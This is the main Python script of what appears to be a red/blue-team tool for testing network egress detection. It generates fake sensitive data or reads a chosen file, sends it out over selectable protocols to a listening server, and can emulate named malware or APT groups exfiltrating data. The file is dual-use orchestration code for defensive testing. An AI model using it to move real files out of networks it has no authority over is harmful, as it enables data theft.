#!/usr/bin/env python3

# This tool is designed to be an easy way to test exfiltrating data
# from the network you are currently plugged into.  Used for red or
# blue teams that want to test network boundary egress detection
# capabilities.

import logging
import sys
import threading
import time
import requests
import base64
import hashlib
import os
from signal import signal, SIGINT
from common import helpers
import json
from common import orchestra
from common.negotiation import Negotiation
import re


def parse_protocols(arguments):

    server_protocols = []

    if re.search(",",arguments.server):
        temp = arguments.server.split(",")

        for full_path, server in the_conductor.server_protocols.items():
            if server.protocol in temp and server.protocol not in server_protocols:
                server_protocols.append(server)
    else:

        for full_path, server in the_conductor.server_protocols.items():
            if server.protocol == arguments.server.lower():
                server_protocols.append(server)

    return server_protocols

def handler(signal_received,frame):
    print("[*] Exiting Program")
    os._exit(1)
    sys.exit(0)

if __name__ == "__main__":

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    helpers.title_screen()
    cli_parsed = helpers.cli_parser()
    the_conductor = orchestra.Conductor()
    linker = {}

    # Check if only listing supported server/client protocols or datatypes
    if cli_parsed.list_servers:
        print("[*] Supported server protocols: \n")
        the_conductor.load_server_protocols(cli_parsed)
        for name, server_module in the_conductor.server_protocols.items():
            print("[+] " + server_module.protocol)
        print()
        sys.exit()

    elif cli_parsed.list_clients:
        print("[*] Supported client protocols: \n")
        the_conductor.load_client_protocols(cli_parsed)
        for name, client_module in the_conductor.client_protocols.items():
            print("[+] " + client_module.protocol)
        print()
        sys.exit()

    elif cli_parsed.list_datatypes:
        print("[*] Supported data types: \n")
        the_conductor.load_datatypes(cli_parsed)
        for name, datatype_module in the_conductor.datatypes.items():
            print("[+] " + datatype_module.cli + " - (" +\
                datatype_module.description + ")")
        print()
        sys.exit()

    elif cli_parsed.list_actors:
        print("[*] Supported malware/APT groups: \n")
        the_conductor.load_actors(cli_parsed)
        for name, datatype_module in the_conductor.actor_modules.items():
            print("[+] " + datatype_module.cli + " - (" +\
                datatype_module.description + ")")
        print()
        sys.exit()

    if cli_parsed.server is not None:
        the_conductor.load_server_protocols(cli_parsed)
        the_conductor.load_actors(cli_parsed)
        server_protocols = parse_protocols(cli_parsed)

        if cli_parsed.negotiation is True:
            server_api = Negotiation(cli_parsed,protocols=server_protocols)
            api_thread = threading.Thread(target=server_api.start)
            api_thread.start()

        # Check if server module is given threat actor vs. normal server
        for actor_path, actor_mod in the_conductor.actor_modules.items():
            # If actor module is what is used, search for the server requirement
            # and load that
            if actor_mod.cli == cli_parsed.server.lower():
                for full_path, server_actor in the_conductor.server_protocols.items():
                    if server_actor.protocol.lower() == actor_mod.server_requirement:
                        server_actor.serve()

        threads = [None] * len(server_protocols)
        for i in range(len(server_protocols)):
            for full_path, server in the_conductor.server_protocols.items():
                if server.protocol == server_protocols[i].protocol:
                    if cli_parsed.negotiation:
                        threads[i] = threading.Thread(target=server.negotiatedServe,args=())
                        threads[i].start()
                        time.sleep(1)
                        requests.get("http://localhost:5000/send-status?protocol=%s&started=True" %server_protocols[i].protocol)
                    else:
                        threads[i] = threading.Thread(target=server.serve)
                        threads[i].start()

        print("[+] Services Started")
        while True:
            if KeyboardInterrupt:
                signal(SIGINT, handler)

    elif cli_parsed.client is not None or cli_parsed.negotiation and cli_parsed.ip is not None:
        # load up all supported client protocols and datatypes
        the_conductor.load_client_protocols(cli_parsed)
        the_conductor.load_datatypes(cli_parsed)

        if cli_parsed.negotiation:
            if cli_parsed.negotiation_file:
                configs = json.loads(open(cli_parsed.negotiation_file, "r").read())
            else:
                configs = json.loads(requests.get("http://%s:5000/get-negotiations" %cli_parsed.ip).content)

            if cli_parsed.folder:
                requests.get("http://%s:5000/create-directory?folder=%s" %(cli_parsed.ip,str(cli_parsed.folder)))

        if cli_parsed.file is None:
            # Loop through and find the requested datatype
            for name, datatype_module in the_conductor.datatypes.items():
                if datatype_module.cli == cli_parsed.datatype.lower():
                    generated_data = datatype_module.generate_data()

                    """ Generate Hash for Generated Data for Client Link """
                    if cli_parsed.folder:
                        linker["folder"] = {"name": cli_parsed.folder,
                                        "digest": hashlib.md5(generated_data.encode()).hexdigest(),
                                        "samples": generated_data.split(",")[0:5]}

                    # Once data has been generated, transmit it using the
                    # protocol requested by the user
                    if cli_parsed.negotiation:
                        for proto_name, proto_module in the_conductor.client_protocols.items():
                            if configs[proto_module.protocol]["enabled"] == "True":
                                requests.get("http://%s:5000/send-status?send=True&protocol=%s" %(cli_parsed.ip, proto_module.protocol))
                                proto_module.negotiatedTransmit(generated_data, config=configs)
                                requests.get("http://%s:5000/send-status?complete=True&protocol=%s" %(cli_parsed.ip, proto_module.protocol))
                                time.sleep(1)

                        if cli_parsed.folder:
                            requests.get("http://%s:5000/move-loot-files?folder=%s&hash=%s"
                                         %((cli_parsed.ip), linker["folder"]["name"], linker["folder"]["digest"]), headers={"samples": base64.b64encode(str(linker["folder"]["samples"]).encode())})

                        sys.exit()
                    else:
                        for proto_name, proto_module in the_conductor.client_protocols.items():
                            if proto_module.protocol == cli_parsed.client.lower():
                                proto_module.transmit(generated_data)
                                helpers.class_info()
                                sys.exit()

        else:
            with open(cli_parsed.file, 'rb') as file_data_handle:
                file_data = file_data_handle.read()

            if cli_parsed.negotiation:
                for proto_name, proto_module in the_conductor.client_protocols.items():
                    if configs[proto_module.protocol]["enabled"] == "True":
                        requests.get("http://%s:5000/send-status?send=True&protocol=%s" % (cli_parsed.ip, proto_module.protocol))
                        proto_module.negotiatedTransmit(file_data, config=configs)
                        requests.get("http://%s:5000/send-status?complete=True&protocol=%s" % (
                        cli_parsed.ip, proto_module.protocol))
                        time.sleep(1)
                sys.exit()
            else:
                for proto_name, proto_module in the_conductor.client_protocols.items():
                    if proto_module.protocol == cli_parsed.client.lower():
                        proto_module.transmit(file_data)
                        helpers.class_info()
                        sys.exit()

        helpers.class_info()
        print("[*] Error: You either didn't provide a valid datatype or client protocol to use.")
        print("[*] Error: Re-run and use --list-datatypes or --list-clients to see possible options.")
        sys.exit()

    elif cli_parsed.actor is not None:
        # Load different threat actors/malware
        the_conductor.load_actors(cli_parsed)

        # Identify the actor to emulate
        for full_path, actor_variant in the_conductor.actor_modules.items():
            if actor_variant.cli == cli_parsed.actor.lower():

                # Check if generating data or using data within the actor module
                if cli_parsed.datatype is not None:
                    the_conductor.load_datatypes(cli_parsed)

                    # Generate the data for the actor to exfil
                    for name, datatype_module in the_conductor.datatypes.items():
                        if datatype_module.cli == cli_parsed.datatype.lower():
                            generated_data = datatype_module.generate_data()

                    actor_variant.emulate(data_to_exfil=generated_data)
                    helpers.class_info()

                # Instead, use the exfil data within the module
                else:
                    actor_variant.emulate()
                    helpers.class_info()
